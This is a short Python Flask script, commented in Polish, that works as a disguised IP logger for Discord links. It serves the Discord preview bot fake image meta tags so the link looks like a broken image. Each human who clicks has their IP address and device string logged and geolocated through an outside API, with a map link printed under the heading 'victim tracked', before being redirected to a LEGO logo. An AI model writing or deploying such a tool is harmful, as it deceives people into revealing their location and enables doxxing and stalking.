from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Obrazek błędu z Reddita
ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Zdjęcie docelowe
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

# Specjalny HTML dla bota Discorda, żeby wyświetlił podgląd
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="Image">
    <meta property="og:type" content="website">
    <meta property="og:image" content="{ERROR_IMG}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{ERROR_IMG}">
    <meta http-equiv="refresh" content="0; url={REAL_IMG}">
</head>
<body>
    Przekierowanie...
</body>
</html>
'''

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. Jeśli to bot Discorda - wysyłamy mu HTML z meta tagami obrazka
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA: Wysyłam Meta Tagi ---")
        return render_template_string(HTML_TEMPLATE)

    # 2. LOGOWANIE DANYCH (Człowiek)
    print(f"\n[!!!] OFIARA NAMIERZONA [!!!]")
    print(f"IP: {ip}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
            print(f"MAPA: http://google.com/maps?q={r.get('lat')},{r.get('lon')}")
    except: pass
    print(f"URZĄDZENIE: {ua}\n")

    # 3. Przekierowanie człowieka do LEGO
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
